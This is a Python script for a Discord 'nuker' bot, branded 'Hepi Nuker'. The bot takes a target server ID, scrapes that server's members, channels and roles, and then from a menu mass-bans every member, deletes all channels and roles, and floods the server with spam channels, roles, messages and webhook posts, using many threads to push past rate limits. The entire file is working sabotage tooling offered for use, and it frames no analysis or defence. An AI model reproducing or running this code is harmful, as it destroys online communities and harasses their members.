import json
import string
import requests
import os
import threading
import time
import discord
from discord.ext import commands
from colorama import Fore
from datetime import timedelta
import random

print(f'''
{Fore.RED}
██╗░░██╗███████╗██████╗░██╗
██║░░██║██╔════╝██╔══██╗██║
███████║█████╗░░██████╔╝██║
██╔══██║██╔══╝░░██╔═══╝░██║
██║░░██║███████╗██║░░░░░██║
╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝{Fore.RED}
▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░ 
    ░     ░ ░  ░  ░▒ ░ ▒░░  
  ░         ░     ░░   ░ ░    
            ░  ░   ░     

{Fore.RESET}{Fore.YELLOW}
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

{Fore.RESET}
''')

with open('setup.json') as f:
  setup = json.load(f)

token = setup.get("token")
scname = setup.get("channel_spam_name")
rcname = setup.get("role_spam_name")
spam_msg = setup.get("spam_message")
scamount = setup.get("channel_spam_amount")
rcamount = setup.get("role_spam_amount")
hookspam = setup.get("webhook_spam")

try:
  members = open('members.txt')
except:
  with open('members.txt', 'w') as f:
    f.write("")
  members = open('members.txt')

try:
  channels = open('channels.txt')
except:
  with open('channels.txt', 'w') as f:
    f.write("")
  channels = open('channels.txt')

try:
  roles = open('roles.txt')
except:
  with open('roles.txt', 'w') as f:
    f.write("")
  roles = open('roles.txt')

i = open('members.txt', 'w')
i.close()
x = open('channels.txt', 'w')
x.close()
y = open('roles.txt', 'w')
y.close()

bot = commands.Bot(command_prefix='?', intents=discord.Intents.all())

headers = {'authorization':"Bot "+token}

guild = input("server id to nuke\n>")
if guild.isnumeric() is False:
  print(f"{Fore.RED}The id must be a number.")
  exit()
else:
  serverid = int(guild)

def randomString(chars):
  return f"{''.join(random.choices(string.ascii_letters + string.digits, k=chars))}"

def main():
  try:
    bot.run(token)
  except Exception as e:
    if "improper token has" in str(e).lower():
      print(f"{Fore.RED}an improper bot token has been passed.")

def createhook(channel):
  try:
    json = {'name': 'Wizzed'}
    r = requests.post(f'https://discord.com/api/v8/channels/{channel}/webhooks',headers=headers,json=json)
    return f"https://discord.com/api/webhooks/{r.json()['id']}/{r.json()['token']}"
  except:
    pass


def sendhook(webhook):
  try:
    while True:
      json={'username': randomString(20),'content':spam_msg}
      requests.post(webhook,json=json)
      try:
        print(f"{Fore.YELLOW}Webhook Spam message sent.{Fore.RESET}")
      except:
        pass
  except:
    pass

def dchannels(cid):
  while True:
    r = requests.delete(f"https://discord.com/api/v8/channels/{cid}", headers=headers)
    print(f"{Fore.RED}Channel deleted{Fore.YELLOW}[{cid}]{Fore.RESET}")
    if 'retry_after' in r.text:
      print(f"Ratelimited, you can try again in: {timedelta(int(r.json()['retry_after']))}.")
    else:
      break

def droles(rid):
  while True:
    r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{rid}", headers=headers)
    print(f"{Fore.RED}role deleted{Fore.YELLOW}[{rid}]{Fore.RESET}")
    if 'retry_after' in r.text:
      print(f"Ratelimited, you can try again in:{timedelta(int(r.json()['retry_after']))}.")
    else:
      break

def sroles(name):
  json = {'name': name, 'type': 0}
  r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
  print(f"{Fore.GREEN}role created.{Fore.RESET}")
  if 'retry_after' in r.text:
    print(f"Ratelimited, you can try again in:{timedelta(int(r.json()['retry_after']))}.")

def massb(user):
  while True:
    r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{user}", headers=headers)
    print(f"{Fore.RED}member banned{Fore.YELLOW}[{guild}]{Fore.RESET}")
    if 'retry_after' in r.text:
      print(f"Ratelimited, you can try again in:{timedelta(int(r.json()['retry_after']))}.")
    else:
      break

def spammer(channel):
  while True:
    json = {'content': spam_msg}
    requests.post(f"https://discord.com/api/v8/channels/{channel}/messages", headers=headers, json=json)
    try:
      print(f"{Fore.YELLOW}Spam message sent{Fore.RESET}")
    except:
      pass

def schannels(name):
  json = {'name': name,'type': 0}
  r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=json)
  print(f"{Fore.GREEN}channel created{Fore.RESET}")
  if hookspam:
    webhook = createhook(r.json()['id'])
    f = threading.Thread(target=sendhook, args=(webhook,))
    f.start()
  else:
    f = threading.Thread(target=spammer, args=(r.json()['id'],))
    f.start()
  if 'retry_after' in r.text:
    print(f"Ratelimited, you can try again in:{timedelta(int(r.json()['retry_after']))}.")

ballvar = []
channvar = []

def wizz():
  print(Fore.RESET)
  print(f"Banall will start shortly...")
  startball = time.time()
  for i in range(0, 50):
    for m in members:
      x = threading.Thread(target=massb, args=(m,))
      x.start()
      ballvar.append(x)
  for thread in ballvar:
    thread.join()
  endball = time.time()
  print(f"Banall complete, time took: {endball - startball}")
  print("channel del will start shortly...")
  startchdel = time.time()
  for i in range(0, 50):
    for c in channels:
      y = threading.Thread(target=dchannels, args=(c,))
      y.start()
      channvar.append(y)
  for threadx in channvar:
    threadx.join()
  endchdel = time.time()
  print(f"channel del complete, time took: {endchdel - startchdel}")
  for fr in range(scamount):
    tr = threading.Thread(target=schannels, args=(scname,))
    tr.start()

def clear():
  os.system('clear')

@bot.event
async def on_ready():
  clear()
  print(f"Bot is not in any servers? the invite url is below!\n{Fore.BLUE}https://discord.com/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=8")
  id = bot.get_guild(serverid)
  if id is None:
    print(f"{Fore.RED}Server not found.")
    exit()
  cdata = open('channels.txt','a')
  print("Getting channels...")
  with cdata as x:
    for channel in id.channels:
      x.write(f"{channel.id}\n")
  print("Getting roles...")
  rdata = open('roles.txt', 'a')
  with rdata as g:
    for role in id.roles:
      g.write(f"{role.id}\n")
  mdata = open('members.txt', 'a')
  print("getting members...")
  with mdata as f:
    for member in id.members:
      f.write(f"{member.id}\n")
  print(Fore.GREEN+"Server has been scraped!"+Fore.RESET)
  print("starting nuke menu...")
  time.sleep(2)
  clear()
  print(Fore.RED + f'''
{Fore.BLUE}Zachists will rise ',:)

{Fore.RED}
██╗░░██╗███████╗██████╗░██╗
██║░░██║██╔════╝██╔══██╗██║
███████║█████╗░░██████╔╝██║
██╔══██║██╔══╝░░██╔═══╝░██║
██║░░██║███████╗██║░░░░░██║
╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝{Fore.RED}
▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░ 
    ░     ░ ░  ░  ░▒ ░ ▒░░  
  ░         ░     ░░   ░ ░    
            ░  ░   ░     

{Fore.RESET}{Fore.YELLOW}
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

{Fore.RESET}
--------Server info---------

Name: {Fore.BLUE}{id.name}{Fore.RESET}
MemberCount: {Fore.GREEN}{len(id.members)}{Fore.RESET}
Channels: {Fore.CYAN}{len(id.channels)}{Fore.RESET}
Owner: {Fore.YELLOW}{id.owner}{Fore.RESET}

--------options---------

(1) Wizz
(2) Delete all channels
(3) Spam channels
(4) banall
(5) delete all roles
(6) spam roles
''' + Fore.RESET)
  while True:
    option = input(">")
    if option == "1":
      wizz()
    elif option == "2":
      for c in channels:
        y = threading.Thread(target=dchannels, args=(c,))
        y.start()
    elif option == "3":
      for fr in range(scamount):
        tr = threading.Thread(target=schannels, args=(scname,))
        tr.start()
    elif option == "4":
      for m in members:
        x = threading.Thread(target=massb, args=(m,))
        x.start()
    elif option == "5":
      for r in roles:
        z = threading.Thread(target=droles, args=(r,))
        z.start()
    elif option == "6":
      for hh in range(rcamount):
        res = threading.Thread(target=sroles, args=(rcname,))
        res.start()


if __name__ == '__main__':
  main()